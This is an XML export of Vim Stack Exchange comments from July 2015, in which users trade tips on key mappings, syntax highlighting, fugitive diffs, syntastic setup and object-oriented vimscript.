  <row Id="5560" PostId="3882" Score="0" Text="@Nobe4 Hey, I guess that particular color scheme was broken. I tried another one and it worked! Thanks for pointing me in the right direction. :-)" CreationDate="2015-07-08T11:14:52.747" UserId="2752" />
  <row Id="5561" PostId="3882" Score="0" Text="And yes, I did reset `php.vim`" CreationDate="2015-07-08T11:16:59.440" UserId="2752" />
  <row Id="5562" PostId="3885" Score="0" Text="Beware that `&lt;C-[&gt;` is the same as `&lt;ESC&gt;`.  It's a really bad idea to mess with that.  You might want to choose a different key combination." CreationDate="2015-07-08T11:20:25.480" UserId="1577" />
  <row Id="5563" PostId="3885" Score="0" Text="@lcd047 oh yeah that is right. thanks for that" CreationDate="2015-07-08T11:26:38.170" UserId="2206" />
  <row Id="5564" PostId="3886" Score="0" Text="Why doesn't `|` work in Windows?" CreationDate="2015-07-08T12:45:02.253" UserId="51" />
  <row Id="5565" PostId="3886" Score="0" Text="`|` doesn't work, you either need `\|` or `&lt;bar&gt;`." CreationDate="2015-07-08T12:48:18.693" UserId="54" />
  <row Id="5566" PostId="3886" Score="0" Text="on the documentation, there is no mention of this incompatibility. But as @michaelmichael said on he's answer : `NB: You may find that your ~/.vimrc doesn't support mapping |, or \|. In these cases, try using &lt;bar&gt; instead.`" CreationDate="2015-07-08T12:49:31.603" UserId="1821" />
  <row Id="5567" PostId="3851" Score="1" Text="@siphiuel I'm not sure if it's a bug or a workflow issue. From a Vim perspective, there's only ever one set of files being diffed against each other, so every buffer in diff mode is contributing to a single diff. I used to run into this a lot, but I don't anymore. Are you using the latest version of fugitive? (I'll post my answer once I'm at a full keyboard)" CreationDate="2015-07-08T12:53:30.970" UserId="64" />
  <row Id="5568" PostId="3801" Score="0" Text="I love using abbreviations for this! If you set `:ab idt &lt;c-r&gt;=strftime('%y-%m-%d %H:%M:%S')&lt;cr&gt;` then you can simply type &quot;idt&quot; while in insert mode." CreationDate="2015-07-08T13:18:50.830" UserId="599" />
  <row Id="5569" PostId="3888" Score="0" Text="But also note that the `&lt;C-p&gt;` is used to autocomplete text in vim, which is a built-in utility. I haved used a `&lt;M-p&gt;` instead. But anyway, the`&lt;Esc&gt;` in front of the command is a very good addition." CreationDate="2015-07-08T13:42:29.307" UserId="2206" />
  <row Id="5570" PostId="3882" Score="1" Text="glad I could help, I recommend watching http://vimcasts.org/episodes/creating-colorschemes-for-vim/ if you want to create your own colorscheme :)" CreationDate="2015-07-08T13:49:33.790" UserId="1821" />
  <row Id="5571" PostId="3888" Score="0" Text="@Alex You have mapped it only in normal mode. So you can still use `&lt;C-P&gt;` in insert mode to autocomplete text." CreationDate="2015-07-08T13:51:34.563" UserId="2620" />
  <row Id="5572" PostId="3831" Score="0" Text="Did you try with some search/substitute/sort commands ?" CreationDate="2015-07-08T13:55:36.503" UserId="1821" />
  <row Id="5573" PostId="3889" Score="0" Text="I don't reproduce, can you give a little more infos about your edition ?" CreationDate="2015-07-08T14:15:23.770" UserId="1821" />
  <row Id="5574" PostId="3889" Score="1" Text="Perhaps you have autoformat on: `:h autoformat` and `set formatoptions?`" CreationDate="2015-07-08T14:28:43.387" UserId="1800" />
  <row Id="5575" PostId="3789" Score="1" Text="Instead of using `?&quot;&lt;Enter&gt;` to search for a quote backward on a line, you can use `F&quot;`. `F` is the same as `f` but searches to the left. The answers below look better for your question, but `F` is a useful command on its own." CreationDate="2015-07-08T14:33:30.000" UserId="2680" />
  <row Id="5576" PostId="3851" Score="0" Text="@tommcdo: just checked - my fugitive version is the latest. Weird though, i've tried reproducing it again, but it's difficult to spot a pattern. Sometimes it works until 3rd or 4th consecutive diff, and then breaks. But it's not a regular behaviour. Given that there's a single diff files set (i'd love to find out more about it), then it would seem it's an issue with Fugitive, in that it does not properly close diff buffers? (sorry if this sounds stupid, i am a total beginner)" CreationDate="2015-07-08T15:35:47.617" UserId="2725" />
  <row Id="5577" PostId="3851" Score="0" Text="@tommcdo There are also two Fugitive issues [#36](https://github.com/tpope/vim-fugitive/issues/36) and [#91](https://github.com/tpope/vim-fugitive/issues/91) that reference the same kind of problem. You've been active in the first thread as well)" CreationDate="2015-07-08T15:45:02.320" UserId="2725" />
  <row Id="5578" PostId="3892" Score="1" Text="Remove the semicolons from the beginning of the commands,  that is invalid syntax." CreationDate="2015-07-08T17:40:32.083" UserId="865" />
  <row Id="5579" PostId="3895" Score="0" Text="Yes, this does return the line percentage, but I was looking for a function which shows the scroll percentage.  (or whatever value `ruler` shows when it is set)" CreationDate="2015-07-08T18:04:45.990" UserId="865" />
  <row Id="5580" PostId="3893" Score="0" Text="I didn't realize I had both Vim and gVim, you are right that gVim can be resized with the mouse. I thought the whole Windows version I am using was called gVim, now I know." CreationDate="2015-07-08T18:29:38.950" UserId="1552" />
  <row Id="5581" PostId="3895" Score="0" Text="I can see the need to know a line, char or byte relative position in a file or buffer, but not the need to have a value of an unknown yet formula :)" CreationDate="2015-07-08T18:29:46.127" UserId="1800" />
  <row Id="5582" PostId="3895" Score="0" Text="I don't really have a particular use for it, I just thought it might be interesting to see what people answer and whether it is possible or not.  :P" CreationDate="2015-07-08T18:42:50.300" UserId="865" />
  <row Id="5583" PostId="3892" Score="2" Text="@EvergreenTree No, it's not invalid to have the `:` in vimscript.  Vim just ignores it.  You can have as many leading `:` as you want." CreationDate="2015-07-08T19:20:36.017" UserId="15" />
  <row Id="5584" PostId="3892" Score="0" Text="I didn't realize that.  I always though it designated a one-liner that the user would type out manually.  Interesting!" CreationDate="2015-07-08T19:23:37.980" UserId="865" />
  <row Id="5585" PostId="3894" Score="0" Text="I found two lines in the vim source code that may be relevant: https://github.com/vim/vim/blob/a46ca5b0234998f81f6e42bcca1f9c4b33323df9/src/buffer.c#L3998 and https://github.com/vim/vim/blob/a46ca5b0234998f81f6e42bcca1f9c4b33323df9/src/buffer.c#L4410" CreationDate="2015-07-08T19:24:44.200" UserId="865" />
  <row Id="5586" PostId="3892" Score="0" Text="I was confused because it worked, but I find it cleaner without" CreationDate="2015-07-08T19:25:59.677" UserId="1821" />
  <row Id="5587" PostId="3896" Score="0" Text="Great!  This works (almost) exactly the same way `ruler` and `%P` does.  I thought that translating the source code could be a way of accomplishing this." CreationDate="2015-07-08T19:26:46.560" UserId="865" />
  <row Id="5588" PostId="3897" Score="1" Text="can this help : http://stackoverflow.com/a/15124717/2558252 ?" CreationDate="2015-07-08T19:34:53.780" UserId="1821" />
  <row Id="5589" PostId="3897" Score="0" Text="thanks for this but can you please elaborate the process in a bit detail? Moreover the answer in not complete. The guy just gave an hint" CreationDate="2015-07-08T19:36:17.260" UserId="2758" />
  <row Id="5590" PostId="3896" Score="0" Text="Very nice! But I still hope for more useful questions (in real life) that will get such good answers." CreationDate="2015-07-08T19:49:12.983" UserId="1800" />
  <row Id="5591" PostId="3892" Score="0" Text="@Nobe4: Your function displays only 15 out of the 23 struct names shown in the question's example. It missed out the other 9 struct names." CreationDate="2015-07-08T21:55:22.290" UserId="2706" />
  <row Id="5592" PostId="3892" Score="0" Text="@manavm-n yes, but as I said, even with a normal search I don't find all keywords. For example : `smsc911x_data`" CreationDate="2015-07-08T21:58:53.170" UserId="1821" />
  <row Id="5593" PostId="3892" Score="0" Text="Are you using the same file as provided in the link?" CreationDate="2015-07-08T22:01:37.240" UserId="2706" />
  <row Id="5594" PostId="3892" Score="0" Text="yes, and searching with my browser's finder, I don't find `smsc911x_data`, `smsc911x_ops`, `smsc911x_platform_config` for example ..." CreationDate="2015-07-08T22:02:51.863" UserId="1821" />
  <row Id="5595" PostId="3892" Score="0" Text="Ahhh.. the person who edited previously put the link to the stable version on Torvald's git tree. However, I posted the output for a prepatch version 4.1.0-rc8." CreationDate="2015-07-08T22:21:24.007" UserId="2706" />
  <row Id="5596" PostId="3892" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/25641/discussion-between-nobe4-and-manav-m-n)." CreationDate="2015-07-08T22:34:38.967" UserId="1821" />
  <row Id="5597" PostId="3888" Score="0" Text="oh yes you are right." CreationDate="2015-07-08T23:17:29.420" UserId="2206" />
  <row Id="5598" PostId="3882" Score="0" Text="@Nobe4 Superb! I can't express how happy this has made me! :) :D" CreationDate="2015-07-09T03:34:12.793" UserId="2752" />
  <row Id="5599" PostId="3899" Score="0" Text="Good enough... Plus, it will most likely maintain window positions for horizontally split windows too. I will accept this answer, after some more testing... Thanks" CreationDate="2015-07-09T04:02:19.943" UserId="2749" />
  <row Id="5600" PostId="3899" Score="0" Text="Works great. I also added the &amp;diff logic from my answer to this answer in my `.exrc`.." CreationDate="2015-07-09T07:05:27.180" UserId="2749" />
  <row Id="5601" PostId="3903" Score="0" Text="great, thank you! can you please explain what exactly `wincmd p` does?" CreationDate="2015-07-09T07:56:59.687" UserId="1317" />
  <row Id="5602" PostId="3903" Score="1" Text="yw. I edited the answer to add an explanation." CreationDate="2015-07-09T09:22:00.593" UserId="1800" />
  <row Id="5606" PostId="3899" Score="0" Text="Diff should work when `'sessionoptions'` has the `localoptions` value." CreationDate="2015-07-09T14:34:05.677" UserId="778" />
  <row Id="5607" PostId="3854" Score="0" Text="You asked for it, @Carpetsmoker. ;-) Function added. (It's rather long.)" CreationDate="2015-07-09T22:23:07.063" UserId="2511" />
  <row Id="5608" PostId="25" Score="0" Text="Check out this question: http://vi.stackexchange.com/questions/3882/change-default-syntax-highlighting-scheme" CreationDate="2015-07-10T09:41:18.747" UserId="2752" />
  <row Id="5609" PostId="3907" Score="2" Text="[This Ingo's answer](http://unix.stackexchange.com/a/116673/90314) might be relevant and not really a good news for you." CreationDate="2015-07-10T09:43:18.880" UserId="1841" />
  <row Id="5610" PostId="3907" Score="4" Text="`&lt;C-[&gt;` is the same as `&lt;ESC&gt;` on UNIX.  Just choose another key combination." CreationDate="2015-07-10T10:04:38.947" UserId="1577" />
  <row Id="5611" PostId="3907" Score="0" Text="Thanks, I'll use something else." CreationDate="2015-07-10T10:58:40.950" UserId="859" />
  <row Id="5612" PostId="3831" Score="0" Text="just use `ctags` and vim tags functionality. &quot;embedded&quot; is no excuse :P  since you can push the source and generate the tags elsewhere, and pull everything back after." CreationDate="2015-07-10T16:07:37.353" UserId="1800" />
  <row Id="5613" PostId="3846" Score="0" Text="I've changed the checkmark because your answer has a defect in byte counting (the answer on which you're basing the byte counting is incorrect). I've posted a [howto over there](https://vi.stackexchange.com/a/3911/2720) and updated my answer here with the improved byte counting method. I hope that you don't mind." CreationDate="2015-07-10T16:55:59.183" UserId="2720" />
  <row Id="5614" PostId="3846" Score="0" Text="No problem, and glad you found a general solution!" CreationDate="2015-07-10T17:00:47.523" UserId="1800" />
  <row Id="5617" PostId="3908" Score="0" Text="Do you have `'noequalalways'` set?" CreationDate="2015-07-10T22:05:40.707" UserId="64" />
  <row Id="5618" PostId="3916" Score="0" Text="Don't do that in Vim, use a watcher instead like Grunt/Brunch/Gulp." CreationDate="2015-07-11T12:10:48.480" UserId="54" />
  <row Id="5619" PostId="3907" Score="0" Text="I wouldn't say this is a duplicate as I was not aware I was tampering with the definition of escape and don't wish to change it. Essentially my question has two parts; the inability to map the key, which I know understand, and why it dumps me into replace mode." CreationDate="2015-07-11T13:59:20.340" UserId="859" />
  <row Id="5620" PostId="3919" Score="1" Text="Just for completeness. I decided to go with this in my vimrc: `nnoremap &lt;Up&gt; 10k` and `nnoremap &lt;Down&gt; 10j` seem to work nicely." CreationDate="2015-07-11T14:39:36.997" UserId="2792" />
  <row Id="5621" PostId="3914" Score="1" Text="Are `autoindent` and `cindent` on? Try setting them on, maybe that will help?" CreationDate="2015-07-11T14:47:26.497" UserId="2792" />
  <row Id="5622" PostId="3914" Score="1" Text="Ok here is a hack in your vimrc add: `inoremap { {&lt;CR&gt;}&lt;C-o&gt;O` this means that every time in insert mode when you hit `{` vim will put a `{`, press Enter, put the closing `}` and open at line above it.  So....... actually instead of using the hack you can just train your fingers to hit `shift + O` after you hit enter." CreationDate="2015-07-11T14:59:58.373" UserId="2792" />
  <row Id="5623" PostId="3913" Score="1" Text="Actually instead of `^ d $` you can do `_ D` (underscore capital d) to cut to end (without newline) from the beginning of text. (this will ignore indenting whitespace at start of line). Might be a bit easier to type." CreationDate="2015-07-11T15:05:40.817" UserId="2792" />
  <row Id="5624" PostId="3923" Score="0" Text="When you create functions in a dictionary directly (i.e. a &quot;numbered function&quot;), you don't need the `dict` keyword. This applies to your &quot;class methods&quot;. See `:h numbered-function`." CreationDate="2015-07-11T19:33:40.627" UserId="21" />
  <row Id="5625" PostId="3923" Score="0" Text="@KarlYngveLervåg Technically it applies to both class and object methods (i.e. there's no need for `dict` for any of the `MyClass` functions).  But I find that confusing, so I tend to add `dict` explicitly." CreationDate="2015-07-11T20:46:27.553" UserId="1577" />
  <row Id="5626" PostId="3924" Score="1" Text="On [SO](http://stackoverflow.com/q/4292733/438329)" CreationDate="2015-07-12T03:45:41.990" UserId="778" />
  <row Id="5627" PostId="3924" Score="0" Text="Thanks! I'd make it an answer here, if you don't." CreationDate="2015-07-12T04:55:49.197" UserId="925" />
  <row Id="5628" PostId="3923" Score="0" Text="I see. So you add `dict` for object methods, but not for class methods, in order to help clarify your intent?" CreationDate="2015-07-12T11:08:29.317" UserId="21" />
  <row Id="5629" PostId="3923" Score="0" Text="@lcd047 Thanks a lot for this amazing answer! I'll have to work on it but that is exactly what I was looking for!" CreationDate="2015-07-12T12:02:54.900" UserId="1841" />
  <row Id="5631" PostId="3916" Score="0" Text="Related: http://vi.stackexchange.com/questions/258/how-do-i-run-a-command-on-creation-of-a-new-file" CreationDate="2015-07-12T15:44:02.817" UserId="205" />
  <row Id="5632" PostId="3919" Score="1" Text="IMHO, you should have mapped those keys to ctrl-u and and cltr-d, respectively. Then you could `set scroll=10` to have a similar behavior." CreationDate="2015-07-12T15:57:20.070" UserId="599" />
  <row Id="5633" PostId="3923" Score="1" Text="@KarlYngveLervåg There's a subtility here, the meaning of `self` is different for class methods and for object methods -- it's the class itself in the former case, and the instance of the current object in the latter.  For this reason I always refer to the class itself as `g:MyClass`, never using `self`, and I mostly see the `dict` as a reminder that it's ok to use `self` (that is, a function that has `dict` always acts on an object instance).  Than again, I don't use class methods much, and when I do that I also tend to omit `dict` everywhere.  Yeah, self-consistency is my middle name. ;)" CreationDate="2015-07-12T16:25:05.277" UserId="1577" />
  <row Id="5634" PostId="3927" Score="0" Text="Thank you, this seems to work very well and is much more easily applied to similar situations than the mix of macros and registers that I had imagined.&#xA;I have one suggestion to generalize your solution:&#xA;Could the function take a string `name` as argument and then perform the substitutions inside `name{ }` instead of `label{ }`? Then I could call the function with argument `label` with the same effect as `:call ReplaceInLabels()`. How would I do that?" CreationDate="2015-07-12T17:24:52.757" UserId="2804" />
  <row Id="5635" PostId="3927" Score="0" Text="Yes, why not :) I edited the answer. I'll also probably add a command that takes a name as parameter (easier to use) - and ... done." CreationDate="2015-07-12T17:31:04.400" UserId="1800" />
  <row Id="5636" PostId="3908" Score="0" Text="@tommcdo nope, I'll give that a whirl" CreationDate="2015-07-12T18:50:45.273" UserId="2778" />
  <row Id="5637" PostId="3908" Score="0" Text="No, don't, I was suspecting that was the problem :)" CreationDate="2015-07-12T18:51:40.227" UserId="64" />
  <row Id="5638" PostId="3927" Score="0" Text="Shouldn't it be `:call ReplaceSpecialChars('label')` instead of `:ReplaceSpecialChars label`? The latter doesn't work for me." CreationDate="2015-07-12T19:14:04.497" UserId="2804" />
  <row Id="5639" PostId="3927" Score="0" Text="I made it as a command, it's easier to run this way. It *should* work though, it just calls the original function with one argument. (I just retested it with a copy/paste on my machine and it runs alright)" CreationDate="2015-07-12T19:21:57.187" UserId="1800" />
  <row Id="5640" PostId="3927" Score="0" Text="Sorry, I missed that part. It works perfectly. Thanks!" CreationDate="2015-07-12T19:23:26.110" UserId="2804" />
  <row Id="5641" PostId="3927" Score="0" Text="You're welcome :)" CreationDate="2015-07-12T19:23:38.903" UserId="1800" />
  <row Id="5642" PostId="3928" Score="1" Text="That's nicer than the 2 lists I used, but it ignores the &quot;replace inside a label only&quot; requirement." CreationDate="2015-07-12T20:46:03.510" UserId="1800" />
  <row Id="5643" PostId="3852" Score="0" Text="@VanLaser I've updated my answer with a final version. It turns out that your original line counting method was fine, but there was a bug in Vim. I've submitted [a patch](https://groups.google.com/forum/#!msg/vim_dev/zX45zm-cnc0/-BWjjh5tlX8J) which [got accepted](https://groups.google.com/forum/#!msg/vim_dev/PnMWN0rujOk/hRxX91VZAc4J), so in the latest version of Vim, your answer will also work as intended." CreationDate="2015-07-12T21:25:00.063" UserId="2720" />
  <row Id="5644" PostId="3852" Score="0" Text="You seem to have done some real digging there (going to the source) - congratulations!" CreationDate="2015-07-12T21:52:53.167" UserId="1800" />
  <row Id="5645" PostId="3929" Score="0" Text="Should only the 1-character-width column of characters be deleted, or all text in between the current cursor position and the target character in the same column?" CreationDate="2015-07-13T00:59:46.423" UserId="2479" />
  <row Id="5647" PostId="3934" Score="1" Text="What kind of contribution do you have in mind?" CreationDate="2015-07-13T05:25:03.163" UserId="1577" />
  <row Id="5648" PostId="3934" Score="0" Text="I just want to support the development team as of now. Bug fixes, doing something out of their TODO list and i don't know what can a beginner like me is assigned to do." CreationDate="2015-07-13T05:27:09.317" UserId="2339" />
  <row Id="5649" PostId="3934" Score="3" Text="There is a [vim_dev](https://groups.google.com/forum/#!forum/vim_dev) group where you can post patches.  Beware however that Vim is a mature project, I don't think they're looking for beginner contributions at this point.  As a result, there are patches that have been floating around for a few _years_ without being merged." CreationDate="2015-07-13T07:07:31.730" UserId="1577" />
  <row Id="5651" PostId="3935" Score="0" Text="Why do you think adding two empty directories to `g:syntastic_c_include_dirs` will accomplish anything useful?" CreationDate="2015-07-13T09:30:46.983" UserId="1577" />
  <row Id="5652" PostId="3935" Score="0" Text="@lcd047 I mentioned properly referring to directory Locations starting with /home/username/directorylocation was mentioned." CreationDate="2015-07-13T09:32:31.493" UserId="2339" />
  <row Id="5653" PostId="3935" Score="0" Text="Right, you did.  What I'm asking is why do you think that's the &quot;proper&quot; way of doing it." CreationDate="2015-07-13T09:38:10.203" UserId="1577" />
  <row Id="5654" PostId="3935" Score="0" Text="https://github.com/scrooloose/syntastic/issues/70   I have referred to this link to understand it as the correct of way doing it. Please suggest, if you i need to add other options as well to get syntastic working properly." CreationDate="2015-07-13T10:04:48.947" UserId="2339" />
  <row Id="5655" PostId="3934" Score="3" Text="Alternatively, check out the neovim project: https://github.com/neovim/neovim/" CreationDate="2015-07-13T10:13:12.073" UserId="1296" />
  <row Id="5656" PostId="3934" Score="0" Text="@lcd047 Thanks a lot and who have submitted these patches that have been floating around and why have they submitted them even if they are not being merged." CreationDate="2015-07-13T10:20:04.947" UserId="2339" />
  <row Id="5657" PostId="3934" Score="0" Text="@PhilippFrank Thanks a lot to you too. Are the changes in the Vim project merged into NeoVim Just out of curiosity?" CreationDate="2015-07-13T10:20:08.413" UserId="2339" />
  <row Id="5658" PostId="3935" Score="0" Text="@lcd047 In additioon to that, I have tried the following as well by having seperate config file for syntastic and configuring it. Reference - http://stackoverflow.com/questions/16622992/including-header-files-recursively-for-syntastic. I am guessing that i am missing something fundamental." CreationDate="2015-07-13T10:49:58.863" UserId="2339" />
  <row Id="5659" PostId="3935" Score="0" Text="Excellent.  Now, can you tell the difference between what you did and what those other people did?" CreationDate="2015-07-13T10:51:47.507" UserId="1577" />
  <row Id="5660" PostId="3934" Score="1" Text="Yes, they are considered, not all make sense or are viable due to changed code, but basically neovim aims to keep up. See https://github.com/neovim/neovim/commits/master for the commits, the latest one just now is the inclusion of a vim patch." CreationDate="2015-07-13T10:51:57.647" UserId="1296" />
  <row Id="5661" PostId="3935" Score="0" Text="Please update your post in a way so that we can try to reproduce this problem. In this case, this would mean a minimal vimrc file (which only loads this plugin, and sets some basic settings) and a few C files which show the problem ..." CreationDate="2015-07-13T11:12:35.747" UserId="51" />
  <row Id="5662" PostId="3935" Score="0" Text="@lcd047 I still am not able to find a difference that might help solve this." CreationDate="2015-07-13T11:28:02.173" UserId="2339" />
  <row Id="5663" PostId="3935" Score="0" Text="@Carpetsmoker Have edited the question to reproduce the problem!" CreationDate="2015-07-13T11:28:20.617" UserId="2339" />
  <row Id="5665" PostId="3935" Score="0" Text="@lcd047 Me myself haven't used a empty string as a include directory, I have just put that and expected it to be self explanatory that i filled proper directory paths." CreationDate="2015-07-13T11:31:35.257" UserId="2339" />
  <row Id="5666" PostId="3935" Score="0" Text="What checker are you using?" CreationDate="2015-07-13T11:32:28.357" UserId="1577" />
  <row Id="5667" PostId="3935" Score="0" Text="I don't know what you mean by a a checker." CreationDate="2015-07-13T11:33:30.743" UserId="2339" />
  <row Id="5668" PostId="3935" Score="0" Text="Did you read the manual?  Syntastic doesn't do any syntax checks by itself, it just runs a number of external checkers against your files and shows you the results.  You're supposed to do some minimal configuration before using it, such as add the [recommended settings](https://github.com/scrooloose/syntastic#user-content-3-recommended-settings) to your vimrc, and set `g:syntastic_c_checkers`." CreationDate="2015-07-13T11:49:21.877" UserId="1577" />
  <row Id="5669" PostId="3935" Score="0" Text="@lcd047 Turns out it was not required to configure those c checkers. The problem was that the .vimrc in the root directory was not picked by my vim even though I was launching it from the root directory of the project. Now, all i need to do is to ensure vim to pick that .vimrc which solves all the problems." CreationDate="2015-07-13T12:02:56.697" UserId="2339" />
  <row Id="5670" PostId="3935" Score="0" Text="_Turns out it was not required to configure those c checkers._ - You are.  Don't bother reporting any problems if you don't." CreationDate="2015-07-13T12:06:55.510" UserId="1577" />
  <row Id="5671" PostId="3935" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/25782/discussion-between-b1tchacked-and-lcd047)." CreationDate="2015-07-13T13:43:16.607" UserId="2339" />
  <row Id="5672" PostId="3923" Score="0" Text="@lcd047 (and @ others too): About the dictionnary used as an object, is it a common way to use vimscript? I haven't looked at a lot of vimscript code yet so I'm not really aware of what the good practices are, so is that generally a good idea to use vimscript as an object oriented language with this dictionnary trick or should I do that only in some particular cases? (I don't want to flood the comments but I'm not sure it is worth a dedicated question tho)" CreationDate="2015-07-13T14:47:13.783" UserId="1841" />
  <row Id="5673" PostId="3938" Score="0" Text="Thanks for a Complete answer and I am definitely not in the game to contribute to add something new but to keep Vim stable and fluid like it always has been." CreationDate="2015-07-13T17:15:04.523" UserId="2339" />
  <row Id="5674" PostId="3934" Score="0" Text="@lcd047 Please add your answer as well stating about the Patches that are not merged so that people would notice and i don't want them going into the comments unnoticed." CreationDate="2015-07-13T17:25:45.400" UserId="2339" />
  <row Id="5675" PostId="3923" Score="0" Text="@statox It's a conceptual scheme, thus OOP in Vim has the same uses and caveats as real OOP in other languages.  It's useful is you're creating objects to model the solution to a problem; it can really get you in a mess if you're creating objects to model the problem rather than the solution.  When done properly it can be invaluable for making things extensible.  So yes, I'd say using OOP is good practice, provided that you take your time to think things properly.  For small, one-time plugins you can get away just fine without OOP.  Then again, you can probably also get away without VimL." CreationDate="2015-07-13T17:53:38.367" UserId="1577" />
  <row Id="5676" PostId="3923" Score="0" Text="@lcd047: Ok that seems legit. I probably won't use it for what I'm doing now but I'll take a look at that soon. Thanks for your answers :-)" CreationDate="2015-07-13T17:58:05.933" UserId="1841" />
  <row Id="5677" PostId="3923" Score="0" Text="@statox From your description above, your problem is precisely one where I'd use OOP right from the beginning.  That's why I wrote all that blurb about classes. _shrug_" CreationDate="2015-07-13T18:24:37.850" UserId="1577" />
  <row Id="5678" PostId="3923" Score="0" Text="@lcd047: Oh I see, I'll take some time to re-think the whole thing then!" CreationDate="2015-07-13T18:33:01.137" UserId="1841" />
  <row Id="5681" PostId="3943" Score="1" Text="I'd have though ctrlp might support it... but apparently it's a [feature request](https://github.com/kien/ctrlp.vim/issues/629)." CreationDate="2015-07-14T04:58:04.970" UserId="205" />
  <row Id="5682" PostId="3945" Score="1" Text="You mean: instead of opening it with vim interactions/BlockInteraction.js +38 ?" CreationDate="2015-07-14T11:39:13.383" UserId="284" />
  <row Id="5683" PostId="3945" Score="1" Text="@Duikboot That doesn't generalize to opening multiple files." CreationDate="2015-07-14T13:28:43.437" UserId="8" />
  <row Id="5684" PostId="3945" Score="0" Text="`grep`, `awk` and something else for construct properly command line? Or looking/writing vim script for this task?" CreationDate="2015-07-14T13:47:07.477" UserId="1145" />
  <row Id="5685" PostId="3944" Score="0" Text="Someone somehow do something like this `let @+=&quot;blah-blah-blah&quot;`?&#xA;`let @+=` sets vim register `&quot;+` aka system clipboard. Look carefully your `.vimrc` and plugins scripts." CreationDate="2015-07-14T17:03:51.410" UserId="1145" />
  <row Id="5686" PostId="3950" Score="0" Text="This works great when &quot;i&quot; is the only character between cursor and the target. Consider: `abci\nhij`, when cursor in on `b`. two search for `i` is necessary to get to the target character since search is linewise." CreationDate="2015-07-14T20:18:02.970" UserId="2295" />
  <row Id="5687" PostId="3951" Score="1" Text="possible duplicate of [Can I delete an entire line, except the line break?](http://vi.stackexchange.com/questions/3105/can-i-delete-an-entire-line-except-the-line-break)" CreationDate="2015-07-14T20:37:59.507" UserId="865" />
  <row Id="5688" PostId="3951" Score="1" Text="it is not a duplicate, as I said I want a more efficient way then going to beginning of line, also I actually want to remove the complete line with the newline character....not just the contents of the line" CreationDate="2015-07-14T20:42:10.947" UserId="1305" />
  <row Id="5689" PostId="3951" Score="0" Text="Oh, I do see what you mean now.  It just wasn't very clear to me what you were trying to accomplish." CreationDate="2015-07-14T20:48:40.173" UserId="865" />
  <row Id="5690" PostId="3950" Score="0" Text="If you want to &quot;delete from the current position to the next instance of i on another line starting on the current column&quot; then just stick a j after the &lt;C-v&gt;." CreationDate="2015-07-14T20:56:16.627" UserId="859" />
  <row Id="5691" PostId="3932" Score="0" Text="`columnmove-f` may be remapped in order to achieve things like `d&lt;m-f&gt;i` to delete along the column until the `i` character. I.e., one can do `omap &lt;m-f&gt;  &lt;c-v&gt;&lt;plug&gt;(columnmove-f)` (and similar for the other motions). I find this to be quite useful." CreationDate="2015-07-14T21:18:24.260" UserId="21" />
  <row Id="5692" PostId="3951" Score="0" Text="`0D` delete line except line break. And than `gJ` to join lines. Now you can put the text without break line and no empty line." CreationDate="2015-07-14T22:02:27.753" UserId="1145" />
  <row Id="5693" PostId="1906" Score="1" Text="The matching for the bonus points does not check if `java_highlight_functions` has been enabled. If you are neurotic about consistency, you should probably check it before the `syn match` call:&#xA;&#xA;`if exists(&quot;java_highlight_functions&quot;) | syn match javaFuncDef &quot;[^-]-&gt;&quot; | endif`" CreationDate="2015-07-14T23:25:57.153" UserId="2832" />
  <row Id="5694" PostId="3956" Score="0" Text="You might want to use `normal!` with the exclamation mark, in order to use only internal vim commands and not commands defined by yourself (or others). Although, it seems as if your first executed normal mode command uses a command (`:H`) that either you or someone else defined (e.g. in a plugin). Your last normal mode command should use the exclamation mark, at least." CreationDate="2015-07-15T21:06:20.690" UserId="21" />
  <row Id="5695" PostId="3957" Score="0" Text="Without exec and without normal? I tried this: `exec '%s/(, /(/g'`, and this: `'%s/(, /(/g'`, and this: `%s/(, /(/g`. But nothing works. `E486: Pattern not found: (, `" CreationDate="2015-07-15T21:29:13.130" UserId="2848" />
  <row Id="5696" PostId="3957" Score="0" Text="I updated the question to explain what the function needs to do." CreationDate="2015-07-15T21:37:23.167" UserId="2848" />
  <row Id="5697" PostId="3956" Score="0" Text="I updated the question to explain what the function needs to do." CreationDate="2015-07-15T21:37:26.217" UserId="2848" />
  <row Id="5698" PostId="3961" Score="0" Text="Thanks, I had no idea about those limitations." CreationDate="2015-07-16T01:34:06.657" UserId="584" />
  <row Id="5699" PostId="3962" Score="2" Text="Possibly useful: http://lardcave.net/text/Highlighting%20arbitrary%20lines%20in%20Vim.html" CreationDate="2015-07-16T03:07:36.167" UserId="205" />
  <row Id="5700" PostId="3898" Score="1" Text="I think it will be nice to include `BufEnter` event into this list (to change label even when we switch between existing buffers), and something like this `autocmd VimLeave * call system(&quot;tmux rename-window 'tmux'&quot;)` for cleanup." CreationDate="2015-07-16T04:02:26.973" UserId="30" />
  <row Id="5701" PostId="3957" Score="1" Text="On a side note: always use &quot;magicness&quot; qualifiers for regexps in scripts: `%s/\m(, /(/g`.  The very fact that the `magic` option changes the semantics of regexps (yet it still can't make regexps &quot;very magic&quot;) means we have to litter our regexps with `\m` or `\v` everywhere, for ever and ever, happily ever after." CreationDate="2015-07-16T04:35:30.667" UserId="1577" />
  <row Id="5702" PostId="3957" Score="0" Text="I updated the answer slightly: I agree with @lcd047 that the `\m` option should be present. Further, since the pattern was not found, the substitute was not necessary. In this case, we simply ignore errors, so I added the `e` flag." CreationDate="2015-07-16T07:33:04.993" UserId="21" />
  <row Id="5703" PostId="3956" Score="0" Text="Your first `exec` command performs four or five edits: I suggest you split the command into the separate edits, instead of having one command doing all of them. This will help greatly in locating errors." CreationDate="2015-07-16T07:34:28.913" UserId="21" />
  <row Id="5704" PostId="3964" Score="0" Text="I have installed vim-airline and `timeoutlen`, `ttimeoutlen` and `esckeys` is default (`timeoutlen=1000 ttimeoutlen=-1 esckeys timeout nottimeout`) and have no any problems, and no delay after exiting insert mode. By the way `:he timeoutlen`, `:he timeout`, `:he esckeys` should explain you I hope." CreationDate="2015-07-16T09:29:54.800" UserId="1145" />
  <row Id="5705" PostId="3962" Score="0" Text="What about `matchaddpos()`?  That allows you to highlight arbitrary areas of text." CreationDate="2015-07-16T13:16:07.457" UserId="865" />
  <row Id="5706" PostId="3962" Score="0" Text="@EvergreenTree `matchaddpos()` has the same limitation as `match`, it was broken until recently, it has a horrendous syntax, and it can handle at most 8 lines.  To highlight lines 3-5 you need to do it like this: `call matchaddpos('FleetingFlashyFiretrucks', [[3], [4], [5]])`.  Really, it isn't one of Vim's best features." CreationDate="2015-07-16T18:04:23.140" UserId="1577" />
